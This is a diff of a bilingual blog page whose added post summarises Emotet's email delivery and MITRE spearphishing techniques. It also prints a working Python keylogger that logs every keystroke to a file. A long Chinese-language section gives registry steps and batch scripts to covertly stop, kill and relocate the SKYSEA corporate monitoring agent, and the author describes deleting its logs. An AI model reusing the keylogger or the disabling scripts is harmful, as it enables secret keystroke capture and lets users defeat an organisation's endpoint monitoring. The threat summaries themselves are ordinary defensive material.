@@ -747,7 +747,7 @@ $$w_t = (1 - \lambda) TV_t^* + \lambda {\Delta TV_t^* \over F_{t-1}^*}$$<p>符�
 	<!-- display as entry -->	
 		<h3 class="title">
 			<div class="date"> 2021-11-12 </div>
-			<div class="article-title"><a href="/2021/11/12/Research-Emotet/" >Research Emotet</a></div>						
+			<div class="article-title"><a href="/2021/11/12/Research-of-Emotet/" >Research of Emotet</a></div>						
 		</h3>
 	
 
@@ -758,20 +758,148 @@ $$w_t = (1 - \lambda) TV_t^* + \lambda {\Delta TV_t^* \over F_{t-1}^*}$$<p>符�
 	<div class="col-md-12">
 	  
 	
-	  <h2 id="Spread-via-Word-documents"><a href="#Spread-via-Word-documents" class="headerlink" title="Spread via Word documents"></a>Spread via Word documents</h2><p>The EMOTET group managed to take email as an attack vector to a next level. Through a fully automated process, EMOTET malware was delivered to the victims’ computers via infected e-mail attachments.  A variety of different lures were used to trick unsuspecting users into opening these malicious attachments. In the past, EMOTET email campaigns have also been presented as invoices, shipping notices and information about COVID-19.</p>
-<p>All these emails contained malicious Word documents, either attached to the email itself or downloadable by clicking on a link within the email itself. Once a user opened one of these documents, they could be prompted to “enable macros” so that the malicious code hidden in the Word file could run and install EMOTET malware on a victim’s computer.</p>
-<h2 id="Attacks-for-hire"><a href="#Attacks-for-hire" class="headerlink" title="Attacks for hire"></a>Attacks for hire</h2><p>EMOTET was much more than just a malware. What made EMOTET so dangerous is that the malware was offered for hire to other cybercriminals to install other types of malware, such as banking Trojans or ransomwares, onto a victim’s computer.</p>
+	  <h2 id="Spread-via-Word-documents"><a href="#Spread-via-Word-documents" class="headerlink" title="Spread via Word documents"></a>Spread via Word documents</h2><p><strong>通过 Word 文档传播</strong></p>
+<div class="tabs" id="spread-via-word-documents"><ul class="nav-tabs"><li class="tab active"><a href="#spread-via-word-documents-1">English</a></li><li class="tab"><a href="#spread-via-word-documents-2">中文</a></li></ul><div class="tab-content"><div class="tab-pane active" id="spread-via-word-documents-1"><p>The EMOTET group managed to take email as an attack vector to a next level. Through a fully automated process, EMOTET malware was delivered to the victims’ computers via infected e-mail attachments.  A variety of different lures were used to trick unsuspecting users into opening these malicious attachments. In the past, EMOTET email campaigns have also been presented as invoices, shipping notices and information about COVID-19.</p>
+<p>All these emails contained malicious Word documents, either attached to the email itself or downloadable by clicking on a link within the email itself. Once a user opened one of these documents, they could be prompted to “enable macros” so that the malicious code hidden in the Word file could run and install EMOTET malware on a victim’s computer.</p></div><div class="tab-pane" id="spread-via-word-documents-2"><p>EMOTET 群体成功将电子邮件作为攻击向量提升到了一个新水平。通过完全自动化的过程，EMOTET 恶意软件通过感染的电子邮件附件传递到受害者的计算机上。各种不同的诱饵被用来欺骗毫无戒备的用户打开这些恶意附件。过去，EMOTET 的电子邮件活动也曾被伪装成发票、运输通知和有关 COVID-19 的信息。</p>
+<p>所有这些电子邮件都包含恶意的 Word 文档，文档要么附在电子邮件中，要么通过点击邮件中的链接下载。一旦用户打开了这些文档，他们可能会被提示『启用宏』，以便隐藏在 Word 文件中的恶意代码可以运行，并在受害者的计算机上安装 EMOTET 恶意软件。</p></div></div></div>
+
+<h2 id="Attacks-for-hire"><a href="#Attacks-for-hire" class="headerlink" title="Attacks for hire"></a>Attacks for hire</h2><p><strong>雇佣攻击</strong></p>
+<div class="tabs" id="attacks-for-hire"><ul class="nav-tabs"><li class="tab active"><a href="#attacks-for-hire-1">English</a></li><li class="tab"><a href="#attacks-for-hire-2">中文</a></li></ul><div class="tab-content"><div class="tab-pane active" id="attacks-for-hire-1"><p>EMOTET was much more than just a malware. What made EMOTET so dangerous is that the malware was offered for hire to other cybercriminals to install other types of malware, such as banking Trojans or ransomwares, onto a victim’s computer.</p>
 <p>This type of attack is called a ‘loader’ operation, and EMOTET is said to be one of the biggest players in the cybercrime world as other malware operators like TrickBot and Ryuk have benefited from it.</p>
-<p>Its unique way of infecting networks by spreading the threat laterally after gaining access to just a few devices in the network made it one of the most resilient malware in the wild.</p>
-<h2 id="Emotet-Malware"><a href="#Emotet-Malware" class="headerlink" title="Emotet Malware"></a><a target="_blank" rel="noopener" href="https://us-cert.cisa.gov/ncas/alerts/aa20-280a">Emotet Malware</a></h2><h2 id="Phishing-Spearphishing-Link"><a href="#Phishing-Spearphishing-Link" class="headerlink" title="Phishing: Spearphishing Link"></a><a target="_blank" rel="noopener" href="https://attack.mitre.org/versions/v7/techniques/T1566/002/">Phishing: Spearphishing Link</a></h2><p>Adversaries may send spearphishing emails with a malicious link in an attempt to elicit sensitive information and&#x2F;or gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments.</p>
-<p>All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs&#x2F;web beacons). Links may also direct users to malicious applications designed to Steal Application Access Tokens, like OAuth tokens, in order to gain access to protected applications and information.</p>
+<p>Its unique way of infecting networks by spreading the threat laterally after gaining access to just a few devices in the network made it one of the most resilient malware in the wild.</p></div><div class="tab-pane" id="attacks-for-hire-2"><p>EMOTET 不仅仅是一种恶意软件。EMOTET 之所以危险，是因为它被提供给其他网络犯罪分子，用于在受害者的计算机上安装其他类型的恶意软件，如银行木马或勒索软件。</p>
+<p>这种类型的攻击被称为『加载程序』操作，EMOTET 被认为是网络犯罪世界中的最大玩家之一，因为其他恶意软件操作员如 TrickBot 和 Ryuk 从中受益。</p>
+<p>它通过在网络中获得访问权限后横向传播威胁的独特方式，使其成为最具弹性的恶意软件之一。</p></div></div></div>
+
+<h2 id="Emotet-Malware"><a href="#Emotet-Malware" class="headerlink" title="Emotet Malware"></a><a target="_blank" rel="noopener" href="https://us-cert.cisa.gov/ncas/alerts/aa20-280a">Emotet Malware</a></h2><p><strong>Emotet 恶意软件</strong></p>
+<h2 id="Phishing-Spearphishing-Link"><a href="#Phishing-Spearphishing-Link" class="headerlink" title="Phishing: Spearphishing Link"></a><a target="_blank" rel="noopener" href="https://attack.mitre.org/versions/v7/techniques/T1566/002/">Phishing: Spearphishing Link</a></h2><p><strong>网络钓鱼：带有恶意链接的鱼叉式钓鱼</strong></p>
+<div class="tabs" id="phishing:-spearphishing-link"><ul class="nav-tabs"><li class="tab active"><a href="#phishing:-spearphishing-link-1">English</a></li><li class="tab"><a href="#phishing:-spearphishing-link-2">中文</a></li></ul><div class="tab-content"><div class="tab-pane active" id="phishing:-spearphishing-link-1"><p>Adversaries may send spearphishing emails with a malicious link in an attempt to elicit sensitive information and&#x2F;or gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments.</p>
+<p>All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs&#x2F;web beacons). Links may also direct users to malicious applications designed to Steal Application Access Tokens, like OAuth tokens, in order to gain access to protected applications and information.</p></div><div class="tab-pane" id="phishing:-spearphishing-link-2"><p>对手可能会发送带有恶意链接的鱼叉式钓鱼电子邮件，试图获取敏感信息或访问受害者的系统。带有链接的鱼叉式钓鱼是一种特定变体，与其他形式的鱼叉式钓鱼不同，它使用链接来下载电子邮件中的恶意软件，而不是将恶意文件附加到电子邮件中，以避开可能检查电子邮件附件的防御。</p>
+<p>所有形式的鱼叉式钓鱼都是针对特定个人、公司或行业的电子社交工程。在这种情况下，恶意电子邮件包含链接。通常，这些链接会伴有社交工程文本，要求用户主动点击或复制并粘贴 URL 到浏览器中，利用用户执行。访问的网站可能会通过利用漏洞来危害浏览器，或者根据电子邮件的背景提示用户下载应用程序、文档、压缩文件甚至可执行文件。对手还可能包括旨在直接与电子邮件阅读器交互的链接，包括旨在直接利用最终系统的嵌入式图像或验证电子邮件接收的 Web 僵尸（即 Web Bugs&#x2F;Web Beacons）。链接还可能将用户引导到旨在窃取应用程序访问令牌（如 OAuth 令牌）的恶意应用程序中，以获得对受保护应用程序和信息的访问权限。</p></div></div></div>
+
+<h2 id="Keylogger"><a href="#Keylogger" class="headerlink" title="Keylogger"></a>Keylogger</h2><p><strong>键盘记录器</strong></p>
+<div class="cell border-box-sizing text_cell rendered"><div class="prompt input_prompt">
+</div><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<div class="highlight"><pre><span></span>python<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>pynput
+</pre></div>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[1]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">pynput</span> <span class="kn">import</span> <span class="n">keyboard</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[2]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">log_file</span> <span class="o">=</span> <span class="s1">&#39;keylog.txt&#39;</span>
+
+<span class="k">def</span> <span class="nf">on_press</span><span class="p">(</span><span class="n">key</span><span class="p">:</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">Key</span> <span class="o">|</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">KeyCode</span> <span class="o">|</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">log_file</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s1">]&#39;</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">Listener</span><span class="p">(</span><span class="n">on_press</span><span class="o">=</span><span class="n">on_press</span><span class="p">)</span> <span class="k">as</span> <span class="n">listener</span><span class="p">:</span>
+    <span class="n">listener</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+ 
+
+
+
+
+<hr>
+<div class="tabs" id="keylogger-detector"><ul class="nav-tabs"><li class="tab active"><a href="#keylogger-detector-1">Keylogger</a></li><li class="tab"><a href="#keylogger-detector-2">键盘记录器</a></li></ul><div class="tab-content"><div class="tab-pane active" id="keylogger-detector-1"><p>How to detect keyloggers?</p>
+<p>Detecting keylogger programs on a computer usually involves fairly obvious warning signs: the browser slows down, there are delays when moving the mouse or typing, or the cursor disappears. Even if you use the best privacy browsers, keyloggers can still track your inputs.</p>
+<hr>
+<p>How keyloggers infect your device?</p>
+<p>Hackers often use social engineering methods to infect victims with keyloggers. A keylogger can infect your device in different ways, sometimes depending on your device type. And even though a spyware removal tool can handle keystroke logger detection, you want to avoid this dangerous type of malware to begin with.</p>
+<p>Here’s the general process for how a keylogger infects your device:</p>
+<ol>
+<li><p>A cybercriminal sends an infected phishing message, usually through an email attachment, SMS message, or infected website.</p>
+</li>
+<li><p>When you click the link for the infected website or attachment, the keylogger automatically downloads itself onto your device.</p>
+</li>
+<li><p>The keystroke tracker immediately starts to collect your keystrokes, most likely without being detected until you run a keylogger scan.</p>
+</li>
+</ol></div><div class="tab-pane" id="keylogger-detector-2"><p>如何检测键盘记录器？</p>
+<p>检测计算机上键盘记录器程序的警告信号通常相当明显：浏览器变慢、鼠标移动或键击时出现延迟，或者光标消失。即使你使用最好的隐私浏览器，键盘记录器也能跟踪你的输入。</p>
+<hr>
+<p>键盘记录器如何感染你的设备？</p>
+<p>黑客通常使用社会工程学方法来感染受害者的设备。键盘记录器可以通过多种方式感染你的设备，这些方式有时取决于你的设备类型。虽然间谍软件清除工具可以处理键盘记录器的检测，但最好的办法是从一开始就避免这种危险的恶意软件。</p>
+<p>以下是键盘记录器感染你设备的一般过程：</p>
+<ol>
+<li><p>网络犯罪分子发送带有感染的钓鱼信息，通常通过电子邮件附件、短信或感染的网站进行发送。</p>
+</li>
+<li><p>当你点击感染网站的链接或附件时，键盘记录器会自动下载到你的设备上。</p>
+</li>
+<li><p>键盘记录器立即开始收集你的按键输入，通常在你运行键盘记录器扫描之前不会被发现。</p>
+</li>
+</ol></div></div></div>
+
+<h2 id="SKYSEA-这个间谍软件的删除方法"><a href="#SKYSEA-这个间谍软件的删除方法" class="headerlink" title="SKYSEA 这个间谍软件的删除方法"></a>SKYSEA 这个间谍软件的删除方法</h2><h3 id="一、详细操作指南"><a href="#一、详细操作指南" class="headerlink" title="一、详细操作指南"></a><a target="_blank" rel="noopener" href="https://note.com/ironhead/n/na2410e5d8d1a">一、详细操作指南</a></h3><p>社内PC上未经允许安装并获取操作日志的麻烦间谍软件。让我们根除这个间谍软件，提高生活质量（QOL）。</p>
+<ol>
+<li><p>使用 <a target="_blank" rel="noopener" href="https://registry-finder.com/bin/2.51.0.0/RegistryFinder64.zip">RegistryFinder</a> 删除注册表中所有包含 “skysea” 的项。也可以使用 regedit，但比较麻烦。</p>
+<p>删除注册表中 Key 列和 Value 列中包含 “SKYSEA” 的记录（右键点击 → 从注册表中删除）。</p>
+</li>
+<li><p>通过资源管理器右键点击 PC → 管理 → 左侧树状图中的 服务和应用程序 → 服务中的 “Swd” 右键点击 → 属性 → 将服务状态设置为停止，将启动类型设置为禁用。</p>
+<p>删除 C:\WINDOWS 目录中的 “wds” 文件夹。</p>
+</li>
+<li><p>通过资源管理器右键点击 PC → 管理 → 左侧树状图中的 服务和应用程序 → 服务中的 “awssm” 右键点击 → 属性 → 将服务状态设置为停止，将启动类型设置为禁用。</p>
+<p>删除 C:\WINDOWS 目录中的 “awssm” 文件夹。</p>
+</li>
+<li><p>将以下文本保存为 .bat 文件并运行。也可以手动停止和禁用服务。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">rem 禁用服务</span><br><span class="line">sc config &quot;Swd&quot; start= disabled</span><br><span class="line">sc config &quot;awssm&quot; start= disabled</span><br><span class="line">sc config &quot;SCVCabProxySvr&quot; start= disabled</span><br><span class="line">sc config &quot;CompactSvc&quot; start= disabled</span><br><span class="line">sc config &quot;ScvUpdSvc&quot; start= disabled</span><br><span class="line">sc config &quot;AstExAgt&quot; start= disabled</span><br><span class="line">sc config &quot;ScvSvc&quot; start= disabled</span><br><span class="line">sc config &quot;SCV LogAgentService&quot; start= disabled</span><br><span class="line">sc config &quot;LogSvr&quot; start= disabled</span><br><span class="line">sc config &quot;IceSvc&quot; start= disabled</span><br><span class="line"></span><br><span class="line">rem 停止服务</span><br><span class="line">net stop &quot;Swd&quot;</span><br><span class="line">net stop &quot;awssm&quot;</span><br><span class="line">net stop &quot;SCVCabProxySvr&quot;</span><br><span class="line">net stop &quot;CompactSvc&quot;</span><br><span class="line">net stop &quot;ScvUpdSvc&quot;</span><br><span class="line">net stop &quot;AstExAgt&quot;</span><br><span class="line">net stop &quot;ScvSvc&quot;</span><br><span class="line">net stop &quot;SCV LogAgentService&quot;</span><br><span class="line">net stop &quot;LogSvr&quot;</span><br><span class="line">net stop &quot;IceSvc&quot;</span><br></pre></td></tr></table></figure>
+
+<p>因为各服务会进行活性监控，需要多次运行 bat 文件来完全停止它们。如果不行的话可以手动从服务界面停止。</p>
+</li>
+<li><p>打开任务管理器，右键点击 “SKYSEA Client View Version 16.1” → 结束任务。然后删除 C:\Program Files (x86) 目录中的 “Sky Product” 文件夹。如果无法删除，可能是服务未完全停止或者任务管理器中还有 “SKYSEA Client View Version 16.1”。</p>
+</li>
+<li><p>重启电脑，如果任务管理器中没有任何与 “SKYSEA” 相关的进程，说明删除成功。</p>
+</li>
+</ol>
+<p>结束监视社会。感谢这家公司，我连藤原竜也都讨厌了。</p>
+<h4 id="2023年10月15日更新"><a href="#2023年10月15日更新" class="headerlink" title="2023年10月15日更新"></a>2023年10月15日更新</h4><p>在多次停止服务后，系统部门又说『日志无法获取了』，我反复说『请远程安装』，然后删除了日志。但随着新版本的发布，他们要求重新安装。我本来不想安装，但最后不得不安装。安装后，他们又说『日志无法获取』，但我不在乎。</p>
+<p>后来我再次尝试删除这个恶心的间谍软件，但 “C:\Program Files (x86)\Sky Product\SKYSEA Client View” 文件夹被占用，无法删除。因为不想查找具体是哪项服务占用，于是按照以下步骤进行处理：</p>
+<ol>
+<li>右键点击 Windows 标志，选择 “运行”。</li>
+<li>输入 “resmon.exe” 并点击 “确定”。</li>
+<li>在资源监视器中，打开 “CPU” 选项卡。</li>
+<li>展开 “关联的句柄” 部分。</li>
+<li>在 “关联的句柄” 搜索框中输入 “SKYSEA Client View”。</li>
+<li>等待搜索结果显示。</li>
+<li>右键点击显示的进程，选择 “结束进程”。</li>
+</ol>
+<p>即便是 Chrome 和 Outlook 也受到影响，这太恶心了。想到系统部门的老男人可能会窥探女性员工的搜索历史，真是太可怕了。</p>
+<p>无法删除文件夹时，可以参考以下 URL，通过移除 administrators 权限并授予 everyone 完全控制权限来删除文件夹：</p>
+<h3 id="二、服务停止与启动脚本"><a href="#二、服务停止与启动脚本" class="headerlink" title="二、服务停止与启动脚本"></a><a target="_blank" rel="noopener" href="https://note.com/ironhead/n/n2720b588193a">二、服务停止与启动脚本</a></h3><p>昨天写的删除方法，其实不用删除注册表也可以停止服务。但是，如果想彻底清理，建议删除注册表项目。</p>
+<p>因为有些公司可能会在删除后抱怨，所以我创建了停止和启动服务的 bat 文件。请在自担风险下使用。</p>
+<h4 id="服务停止-bat"><a href="#服务停止-bat" class="headerlink" title="服务停止.bat"></a>服务停止.bat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">rem 禁用服务并停止，移动模块</span><br><span class="line">sc config &quot;Swd&quot; start= disabled</span><br><span class="line">net stop &quot;Swd&quot;</span><br><span class="line">move C:\Windows\wds C:\kasu\wds</span><br><span class="line"></span><br><span class="line">sc config &quot;awssm&quot; start= disabled</span><br><span class="line">net stop &quot;awssm&quot;</span><br><span class="line">move C:\WINDOWS\avv5sm C:\kasu\avv5sm</span><br><span class="line"></span><br><span class="line">rem 终止进程</span><br><span class="line">taskkill /F /im CtlCli64.exe</span><br><span class="line">taskkill /F /im LogChromeNativeHost.exe</span><br><span class="line">taskkill /F /im AstAgent.exe</span><br><span class="line">taskkill /F /im CtlCli.exe</span><br><span class="line">taskkill /F /im SvcMon.exe</span><br><span class="line">taskkill /F /im SKYSEAHS.exe</span><br><span class="line"></span><br><span class="line">rem 禁用其他服务</span><br><span class="line">sc config &quot;SCVCabProxySvr&quot; start= disabled</span><br><span class="line">sc config &quot;CompactSvc&quot; start= disabled</span><br><span class="line">sc config &quot;ScvUpdSvc&quot; start= disabled</span><br><span class="line">sc config &quot;AstExAgt&quot; start= disabled</span><br><span class="line">sc config &quot;ScvSvc&quot; start= disabled</span><br><span class="line">sc config &quot;SCV LogAgentService&quot; start= disabled</span><br><span class="line">sc config &quot;LogSvr&quot; start= disabled</span><br><span class="line">sc config &quot;IceSvc&quot; start= disabled</span><br><span class="line"></span><br><span class="line">rem 停止其他服务</span><br><span class="line">net stop &quot;SCVCabProxySvr&quot;</span><br><span class="line">net stop &quot;CompactSvc&quot;</span><br><span class="line">net stop &quot;ScvUpdSvc&quot;</span><br><span class="line">net stop &quot;AstExAgt&quot;</span><br><span class="line">net stop &quot;ScvSvc&quot;</span><br><span class="line">net stop &quot;SCV LogAgentService&quot;</span><br><span class="line">net stop &quot;LogSvr&quot;</span><br><span class="line">net stop &quot;IceSvc&quot;</span><br><span class="line"></span><br><span class="line">rem 移动 C:\Program Files (x86)\Sky Product 文件夹</span><br><span class="line">move &quot;C:\Program Files (x86)\Sky Product&quot; &quot;C:\kasu&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="服务启动-bat"><a href="#服务启动-bat" class="headerlink" title="服务启动.bat"></a>服务启动.bat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">rem 启用服务并启动，移动模块</span><br><span class="line">sc config &quot;Swd&quot; start= auto</span><br><span class="line">net start &quot;Swd&quot;</span><br><span class="line">move C:\kasu\wds C:\Windows\wds</span><br><span class="line"></span><br><span class="line">sc config &quot;awssm&quot; start= auto</span><br><span class="line">net start &quot;awssm&quot;</span><br><span class="line">move C:\kasu\avv5sm C:\WINDOWS\avv5sm</span><br><span class="line"></span><br><span class="line">rem 启用其他服务</span><br><span class="line">sc config &quot;SCVCabProxySvr&quot; start= auto</span><br><span class="line">sc config &quot;CompactSvc&quot; start= auto</span><br><span class="line">sc config &quot;ScvUpdSvc&quot; start= auto</span><br><span class="line">sc config &quot;AstExAgt&quot; start= auto</span><br><span class="line">sc config &quot;ScvSvc&quot; start= auto</span><br><span class="line">sc config &quot;SCV LogAgentService&quot; start= auto</span><br><span class="line">sc config &quot;LogSvr&quot; start= auto</span><br><span class="line">sc config &quot;IceSvc&quot; start= auto</span><br><span class="line"></span><br><span class="line">rem 启动其他服务</span><br><span class="line">net start &quot;SCVCabProxySvr&quot;</span><br><span class="line">net start &quot;CompactSvc&quot;</span><br><span class="line">net start &quot;ScvUpdSvc&quot;</span><br><span class="line">net start &quot;AstExAgt&quot;</span><br><span class="line">net start &quot;ScvSvc&quot;</span><br><span class="line">net start &quot;SCV LogAgentService&quot;</span><br><span class="line">net start &quot;LogSvr&quot;</span><br><span class="line">net start &quot;IceSvc&quot;</span><br><span class="line"></span><br><span class="line">rem 移动 C:\Program Files (x86)\Sky Product 文件夹回原位置</span><br><span class="line">move &quot;C:\kasu\Sky Product&quot; &quot;C:\Program Files (x86)&quot;</span><br></pre></td></tr></table></figure>
 
 	
 	</div>
 	
   
 </div>
-	<a type="button" href="/2021/11/12/Research-Emotet/#more" class="btn btn-default more">Read More</a>
+	<a type="button" href="/2021/11/12/Research-of-Emotet/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -1671,43 +1799,43 @@ jupyter<span class="w"> </span>kernelspec<span class="w"> </span>uninstall<span 
 		
 			<li><a href="/tags/启示录/">启示录<span>2</span></a></li>
 		
-			<li><a href="/tags/自分を休ませる/">自分を休ませる<span>4</span></a></li>
+			<li><a href="/tags/Bible/">Bible<span>2</span></a></li>
 		
-			<li><a href="/tags/雅歌/">雅歌<span>1</span></a></li>
-		
-			<li><a href="/tags/Notebooks/">Notebooks<span>14</span></a></li>
-		
-			<li><a href="/tags/Imaging/">Imaging<span>3</span></a></li>
-		
-			<li><a href="/tags/Pharisee/">Pharisee<span>2</span></a></li>
-		
-			<li><a href="/tags/UltimateFacts/">UltimateFacts<span>4</span></a></li>
-		
-			<li><a href="/tags/Neuro/">Neuro<span>5</span></a></li>
-		
-			<li><a href="/tags/诗篇/">诗篇<span>2</span></a></li>
-		
-			<li><a href="/tags/箴言/">箴言<span>2</span></a></li>
-		
-			<li><a href="/tags/Metaverse/">Metaverse<span>13</span></a></li>
-		
-			<li><a href="/tags/Nietzsche/">Nietzsche<span>3</span></a></li>
-		
-			<li><a href="/tags/BioBuilder/">BioBuilder<span>12</span></a></li>
+			<li><a href="/tags/Lyrics/">Lyrics<span>4</span></a></li>
 		
 			<li><a href="/tags/Psalms/">Psalms<span>11</span></a></li>
 		
-			<li><a href="/tags/Typography/">Typography<span>4</span></a></li>
-		
-			<li><a href="/tags/Bible/">Bible<span>2</span></a></li>
-		
-			<li><a href="/tags/Logotherapy/">Logotherapy<span>3</span></a></li>
+			<li><a href="/tags/Syt-7/">Syt-7<span>1</span></a></li>
 		
 			<li><a href="/tags/Quantum/">Quantum<span>4</span></a></li>
 		
-			<li><a href="/tags/Syt-7/">Syt-7<span>1</span></a></li>
+			<li><a href="/tags/Nietzsche/">Nietzsche<span>3</span></a></li>
 		
-			<li><a href="/tags/Lyrics/">Lyrics<span>4</span></a></li>
+			<li><a href="/tags/Typography/">Typography<span>4</span></a></li>
+		
+			<li><a href="/tags/Neuro/">Neuro<span>5</span></a></li>
+		
+			<li><a href="/tags/BioBuilder/">BioBuilder<span>12</span></a></li>
+		
+			<li><a href="/tags/Logotherapy/">Logotherapy<span>3</span></a></li>
+		
+			<li><a href="/tags/雅歌/">雅歌<span>1</span></a></li>
+		
+			<li><a href="/tags/Metaverse/">Metaverse<span>13</span></a></li>
+		
+			<li><a href="/tags/箴言/">箴言<span>2</span></a></li>
+		
+			<li><a href="/tags/Imaging/">Imaging<span>3</span></a></li>
+		
+			<li><a href="/tags/Notebooks/">Notebooks<span>14</span></a></li>
+		
+			<li><a href="/tags/自分を休ませる/">自分を休ませる<span>4</span></a></li>
+		
+			<li><a href="/tags/UltimateFacts/">UltimateFacts<span>4</span></a></li>
+		
+			<li><a href="/tags/Pharisee/">Pharisee<span>2</span></a></li>
+		
+			<li><a href="/tags/CoD/">CoD<span>16</span></a></li>
 		
 		
 			<li><a href="/tags">...<span>21</span></a></li>
